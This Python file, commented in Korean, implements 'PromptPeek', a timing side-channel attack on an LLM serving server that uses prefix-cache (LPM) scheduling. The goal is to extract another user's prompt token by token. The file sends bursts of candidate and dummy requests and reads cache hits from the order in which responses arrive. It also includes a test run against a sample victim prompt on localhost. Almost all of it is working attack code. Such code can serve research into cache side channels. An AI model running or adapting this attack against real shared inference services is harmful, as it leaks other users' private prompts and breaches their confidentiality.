"""
PromptPeek Attack Implementation for LPM Server
단일 토큰 추출 공격 구현
"""
import asyncio
import logging
from typing import List, Optional, Dict, Tuple
import httpx
from promptpeek.candidate.base import get_top_k_candidates, get_bottom_k_dummies

logger = logging.getLogger(__name__)

# Configuration for LPM Server
LPM_SERVER_URL = "http://localhost:9000"
CANDIDATES_SIZE = 256  # Number of candidate tokens to consider (reduced)
DUMMIES_SIZE = 8      # Number of dummy requests (reduced)


# Timing configuration
PRE_SLEEP_TIME = 0.1    # Delay after pre-dummies (increased)
POST_SLEEP_TIME = 0.1   # Delay after candidates (increased)

# HTTP client configuration
HTTPX_MAX_CONNECTIONS = int((CANDIDATES_SIZE + DUMMIES_SIZE * 2) * 1.2)  # Maximum concurrent connections
HTTPX_KEEPALIVE_CONNECTIONS = 20  # Keep-alive connection pool
REQUEST_TIMEOUT = 660.0  # Individual request timeout in seconds (increased for queue wait time)


async def peek_one_token(prefix: str, victim_prompt: Optional[str] = None) -> Optional[str]:
    """
    단일 토큰 추출 공격 - LPM 스케줄링을 이용한 타이밍 공격
    
    Args:
        prefix: 현재까지 알고 있는 프롬프트 접두사
        victim_prompt: (Optional) 피해자 프롬프트 - 테스트용
    
    Returns:
        추출된 토큰 또는 None
    """
    logger.info(f"[*] Attacking prefix: '{prefix[:50]}...'")
    
    # 1. Victim 프롬프트를 캐시에 로드 (테스트용)
    if victim_prompt:
        await _send_victim_request(victim_prompt)
        await asyncio.sleep(0.5)  # 캐시 로딩 대기
    
    # 2. 후보 토큰 생성
    logger.info(f"[*] Generating candidate tokens...")
    candidates = get_top_k_candidates(prefix, k=CANDIDATES_SIZE)
    dummies = get_bottom_k_dummies(prefix, k=DUMMIES_SIZE)
    # dummies = ["%"] * DUMMIES_SIZE  # 고정된 저확률 토큰 사용
    
    logger.info(f"[*] Generated {len(candidates)} candidates and {len(dummies)} dummies")
    
    # 3. 공격 요청 전송 및 응답 순서 관찰
    matched_token = await _send_attack_requests(prefix, candidates, dummies)
    
    if matched_token:
        logger.info(f"[+] Successfully extracted token: '{matched_token}'")
    else:
        logger.warning(f"[-] No token matched - cache miss or eviction")
    
    return matched_token


async def _send_victim_request(prompt: str):
    """피해자 요청을 서버에 전송하여 캐시에 로드"""
    logger.info(f"[VICTIM] Sending victim prompt to cache: '{prompt[:50]}...'")
    
    try:
        async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT) as client:
            response = await client.post(
                f"{LPM_SERVER_URL}/generate",
                content=prompt.encode('utf-8'),
                headers={'Content-Type': 'text/plain'}
            )
            response.raise_for_status()
            logger.info(f"[VICTIM] Prompt cached successfully")
    except httpx.ConnectError as e:
        logger.error(f"[VICTIM] Connection failed: {e}")
        raise
    except httpx.TimeoutException as e:
        logger.error(f"[VICTIM] Request timeout: {e}")
        raise
    except Exception as e:
        logger.error(f"[VICTIM] Error: {e}")
        raise


async def _send_lpm_request(
    client: httpx.AsyncClient,
    prompt: str,
    metadata: Dict
) -> Tuple[str, Dict]:
    """LPM 서버에 단일 요청 전송 with retry logic"""
    max_retries = 3
    retry_delay = 0.5
    
    for attempt in range(max_retries):
        try:
            response = await client.post(
                f"{LPM_SERVER_URL}/generate",
                content=prompt.encode('utf-8'),
                headers={'Content-Type': 'text/plain'},
                timeout=REQUEST_TIMEOUT
            )
            response.raise_for_status()
            response_text = response.text
            return response_text, metadata
        except (httpx.ConnectError, httpx.TimeoutException) as e:
            if attempt < max_retries - 1:
                logger.debug(f"Retry {attempt + 1}/{max_retries} for {metadata.get('id', 'unknown')}: {e}")
                await asyncio.sleep(retry_delay)
                continue
            else:
                logger.error(f"Connection failed for {metadata.get('id', 'unknown')} after {max_retries} attempts: {e}")
                return "", metadata
        except Exception as e:
            logger.error(f"Request failed for {metadata.get('id', 'unknown')}: {e}")
            return "", metadata
    
    return "", metadata


async def _send_attack_requests(
    prefix: str,
    candidates: List[str],
    dummies: List[str]
) -> Optional[str]:
    """
    공격 요청을 순서대로 전송하고 응답 순서를 관찰
    
    순서: [Pre-dummy] → [Candidates] → [Post-dummy]
    """
    # 더미 프롬프트: 동일한 저확률 토큰 사용 (캐시 재사용)
    dummy_prompt = prefix + dummies[0] * 2
    
    # 올바른 limits 설정
    limits = httpx.Limits(
        max_keepalive_connections=HTTPX_KEEPALIVE_CONNECTIONS,
        max_connections=HTTPX_MAX_CONNECTIONS,
        keepalive_expiry=30.0
    )
    
    async with httpx.AsyncClient(
        timeout=REQUEST_TIMEOUT,
        limits=limits,
        http2=False  # HTTP/1.1 사용 (더 안정적)
    ) as client:
        tasks = []
        
        # Step 1: Pre-dummy 요청 전송
        logger.info(f"[1/3] Sending {DUMMIES_SIZE} pre-dummy requests...")
        for i in range(DUMMIES_SIZE):
            metadata = {
                "type": "pre_dummy",
                "id": f"pre_dummy_{i}"
            }
            task = asyncio.create_task(_send_lpm_request(client, dummy_prompt, metadata))
            tasks.append(task)
        
        await asyncio.sleep(PRE_SLEEP_TIME)
        
        # Step 2: Candidate 요청 전송
        logger.info(f"[2/3] Sending {len(candidates)} candidate requests...")
        for i, token in enumerate(candidates):
            candidate_prompt = prefix + token * 2
            metadata = {
                "type": "candidate",
                "id": f"candidate_{i}",
                "token": token
            }
            task = asyncio.create_task(_send_lpm_request(client, candidate_prompt, metadata))
            tasks.append(task)
        
        await asyncio.sleep(POST_SLEEP_TIME)
        
        # Step 3: Post-dummy 요청 전송
        logger.info(f"[3/3] Sending {DUMMIES_SIZE} post-dummy requests...")
        for i in range(DUMMIES_SIZE):
            metadata = {
                "type": "post_dummy",
                "id": f"post_dummy_{i}"
            }
            task = asyncio.create_task(_send_lpm_request(client, dummy_prompt, metadata))
            tasks.append(task)
        
        # Step 4: 응답 순서 관찰
        logger.info(f"[*] Observing response order...")
        response_order = []
        first_post_dummy_arrived = False
        matched_candidates = []
        failed_requests = 0
        
        for task in asyncio.as_completed(tasks):
            try:
                response_text, metadata = await task
                
                # 빈 응답은 실패한 요청
                if not response_text:
                    failed_requests += 1
                    logger.debug(f"[!] Failed request: {metadata.get('id', 'unknown')}")
                    continue
                
                response_order.append(metadata)
                
                if metadata["type"] == "post_dummy" and not first_post_dummy_arrived:
                    first_post_dummy_arrived = True
                    logger.debug(f"[*] First post-dummy arrived at position {len(response_order)}")
                
                elif metadata["type"] == "candidate":
                    # Post-dummy가 도착하기 전에 온 candidate는 캐시 히트
                    if not first_post_dummy_arrived:
                        matched_candidates.append(metadata["token"])
                        logger.info(f"[+] Cache HIT detected: '{metadata['token']}' at position {len(response_order)}")
        
            except Exception as e:
                logger.error(f"Task failed: {e}")
        
        # Step 5: 결과 분석
        logger.info(f"\n{'='*60}")
        logger.info(f"Response Order Analysis:")
        logger.info(f"  Total requests: {len(tasks)}")
        logger.info(f"  Successful responses: {len(response_order)}")
        logger.info(f"  Failed requests: {failed_requests}")
        logger.info(f"  Matched candidates: {len(matched_candidates)}")
        
        if failed_requests > len(tasks) * 0.3:  # 30% 이상 실패시 경고
            logger.warning(f"[!] High failure rate: {failed_requests}/{len(tasks)} ({failed_requests*100/len(tasks):.1f}%)")
            logger.warning(f"[!] Consider reducing CANDIDATES_SIZE or DUMMIES_SIZE")
        
        if matched_candidates:
            logger.info(f"  First match: '{matched_candidates[0]}'")
            if len(matched_candidates) > 1:
                logger.info(f"  All matches: {matched_candidates[:5]}")
            return matched_candidates[0]
        
        return None


async def flush_cache():
    """LPM 서버의 캐시를 초기화"""
    logger.info("[*] Flushing LPM server cache...")
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.post(f"{LPM_SERVER_URL}/flush_cache")
            response.raise_for_status()
            logger.info("[+] Cache flushed successfully")
    except Exception as e:
        logger.error(f"[!] Cache flush failed: {e}")


async def test_attack(victim_prompt: str, known_prefix: str) -> Optional[str]:
    """
    테스트 시나리오: 알려진 피해자 프롬프트에 대한 공격 테스트
    """
    print("\n" + "="*80)
    print("PromptPeek Attack Test - Single Token Extraction")
    print("="*80 + "\n")
    
    print(f"[TEST] Victim prompt: '{victim_prompt}'")
    print(f"[TEST] Known prefix:  '{known_prefix}'")
    print(f"[TEST] Expected token: ' ' or ' s' or ' se'\n")
    
    # 캐시 초기화
    await flush_cache()
    
    # 공격 실행
    extracted_token = await peek_one_token(known_prefix, victim_prompt=victim_prompt)
    
    # 결과 출력
    print("\n" + "="*80)
    if extracted_token:
        print(f"[RESULT] ✓ Attack succeeded!")
        print(f"[RESULT] Extracted token: '{extracted_token}'")
        print(f"[RESULT] Reconstructed: '{known_prefix + extracted_token}'")
    else:
        print(f"[RESULT] ✗ Attack failed - no token extracted")
    print("="*80 + "\n")
    
    return extracted_token


def main():
    asyncio.run(test_attack(
        victim_prompt='I want you to act as an advertiser. You will create a campaign to promote a product or service of your choice. You will choose a target audience, develop key messages and slogans, select the media channels for promotion, and decide on any additional activities needed to reach your goals. My first suggestion request is "I need help creating an advertising campaign for a new type of energy drink targeting young adults aged 18-30."',
        known_prefix="I want you to act as an advertiser. You will create a campaign to promote a product or service of your"
    ))
